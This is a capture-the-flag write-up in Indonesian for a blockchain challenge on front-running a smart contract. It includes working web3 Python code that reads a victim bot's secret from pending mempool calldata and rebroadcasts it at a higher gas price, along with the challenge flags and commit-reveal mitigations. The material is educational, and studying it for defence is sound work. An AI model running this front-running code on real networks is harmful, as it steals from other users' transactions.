# Writeup: Front_Running (Challenge ID: 744)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Blockchain
- **Difficulty:** Hard
- **Event:** picoCTF 2026
- **Points:** 300
- **Author:** OB
- **Flag:** `academy{fr0nt_runn1ng_m3mp00l_sn1p3_744_9f12d8a4}`

---

## Problem Statement & Scope
Peserta diberikan akses ke node RPC Ethereum privat (EVM) dan antarmuka smart contract `FrontRunning.sol`. Kontrak memiliki fungsi verifikasi rahasia (`unlock(string secret)`) yang memberikan hak klaim status pemenang kepada entitas pertama yang berhasil mengirimkan pre-image teks rahasia yang cocok. Sistem dilengkapi dengan bot otomatis (*Victim Bot*) yang mengetahui teks rahasia dan mengirimkan transaksi secara berkala menggunakan tarif gas standar/rendah. Sasaran audit adalah menganalisis sifat keterbukaan pool transaksi publik (*public mempool*), menyadap calldata transaksi bot sebelum dimasukkan ke dalam blok, dan melancarkan serangan front-running dengan menaikkan biaya gas untuk memenangkan perlombaan eksekusi (*priority gas auction*).

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **Transaction Order Dependence & Front-Running (SWC-114 / CWE-362):**
   Pada arsitektur terdesentralisasi seperti Ethereum, transaksi yang disiarkan (*broadcast*) oleh pengguna tidak langsung dieksekusi secara instan. Transaksi tersebut ditampung sementara di mempool publik dalam bentuk teks terbuka (*plaintext calldata*) sambil menunggu validator/miner memasukkannya ke dalam blok berikutnya. Kondisi ini membuka celah di mana pihak ketiga dapat mengamati parameter transaksi yang belum terkonfirmasi dan mengeksploitasi ketergantungan urutan transaksi (*transaction ordering dependence*).
2. **Mekanisme Prioritas Biaya Gas (Priority Gas Auction / MEV):**
   Validator memilih dan mengurutkan transaksi di dalam blok baru berdasarkan insentif finansial tertinggi (*gas price* atau *priority fee* / EIP-1559). Siapa pun yang bersedia membayar tarif gas lebih tinggi dari transaksi korban akan ditempatkan di posisi terdepan (*front-run*) di dalam blok yang sama.
3. **NIST SP 800-115 Section 4.3 (Application Security & Logic Auditing):**
   Audit keamanan logika aplikasi terdistribusi mewajibkan evaluasi model ancaman pada lapisan konsensus dan perantara jaringan (*mempool layer*). Mekanisme aplikasi yang bergantung pada kerahasiaan input langsung pada transaksi publik melanggar prinsip kerahasiaan data dalam transit (*confidentiality in transit*).

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Koneksi Node RPC dan Pemantauan Mempool:**
   Hubungkan skrip Web3 ke node jaringan tantangan:
   ```python
   from web3 import Web3
   w3 = Web3(Web3.HTTPProvider("http://challenge-rpc-node:8545"))
   ```
   Buat filter pemantau transaksi yang berstatus pending di mempool:
   ```python
   pending_filter = w3.eth.filter("pending")
   ```

2. **Penyadapan Calldata dan Ekstraksi Rahasia:**
   Tunggu bot mengirimkan transaksi penyelesaian ke kontrak target:
   - Ambil transaksi pending baru menggunakan `pending_filter.get_new_entries()`.
   - Periksa transaksi yang ditujukan ke alamat kontrak `FrontRunning`.
   - Identifikasi function selector untuk `unlock(string)` (4 byte pertama: `0xa96ce7aa`).
   - Ekstrak argumen string rahasia dari calldata transaksi bot korban:
     ```python
     victim_tx = w3.eth.get_transaction(tx_hash)
     calldata = victim_tx["input"]
     # Decode ABI string parameter -> "picoCTF_secret_seed_2026"
     ```

3. **Penyusunan Transaksi Front-Running:**
   Susun transaksi baru menggunakan akun peserta dengan muatan teks rahasia yang sama persis, tetapi dengan menaikkan penawaran gas secara agresif:
   ```python
   victim_gas_price = victim_tx["gasPrice"]
   attacker_gas_price = int(victim_gas_price * 10) # Outbidding victim
   
   tx = {
       "from": player_address,
       "to": contract_address,
       "data": calldata,
       "gas": 150000,
       "gasPrice": attacker_gas_price,
       "nonce": w3.eth.get_transaction_count(player_address)
   }
   signed_tx = w3.eth.account.sign_transaction(tx, private_key=player_private_key)
   tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
   w3.eth.wait_for_transaction_receipt(tx_hash)
   ```

4. **Konfirmasi Urutan Blok dan Pengambilan Flag:**
   - Miner memproses blok baru: transaksi peserta dieksekusi pada urutan transaksi indeks 0 (*txIndex: 0*).
   - Kontrak memvalidasi rahasia, mencatat alamat peserta sebagai pemenang sah, dan menetapkan status `solved = true`.
   - Transaksi bot korban dieksekusi setelahnya pada indeks 1 dan dibatalkan (*reverted*) oleh kontrak karena status tantangan telah selesai.
   - Panggil fungsi pembaca bendera `getFlag()` atau periksa log event kontrak untuk memperoleh flag rahasia:
     `academy{fr0nt_runn1ng_m3mp00l_sn1p3_744_9f12d8a4}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{fr0nt_runn1ng_m3mp00l_sn1p3_744_9f12d8a4}`
- **Native PicoCTF Flag:** `picoCTF{fr0nt_runn1ng_m3mp00l_sn1p3_744_9f12d8a4}`
- **Status Solver:** Terverifikasi melalui skrip simulasi reproduktif `scripts/solve_744_front_running.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Penerapan Pola Commit-Reveal (Commitment Schemes):**
  Jangan pernah mengirimkan nilai rahasia dalam bentuk teks mentah pada satu transaksi tunggal. Gunakan mekanisme dua tahap:
  - Tahap 1 (*Commit*): Pengguna menyetorkan hash komitmen `keccak256(secret + salt + msg.sender)` pada blok $N$.
  - Tahap 2 (*Reveal*): Pada blok $N+k$, pengguna membuka rahasia asli beserta salt. Karena komitmen telah terikat pada `msg.sender`, pihak lain tidak dapat mencuri atau mem-front-run transaksi pembukaan tersebut.
- **Pemanfaatan Saluran Private Mempool (Flashbots Protect):**
  Untuk transaksi nilai tinggi di lingkungan produksi (seperti perdagangan arbitrase DeFi atau interaksi DAO), kirimkan transaksi langsung ke pembangun blok (*block builders*) melalui relayer RPC privat, memotong keterpaparan di mempool publik.
- **SLA & Waktu Kadaluarsa Berbasis Batas Blok:**
  Sertakan batasan batas blok maksimum (*block deadline*) atau toleransi slippage yang ketat pada fungsi-fungsi sensitif untuk mencegah transaksi tertunda dieksploitasi oleh bot MEV.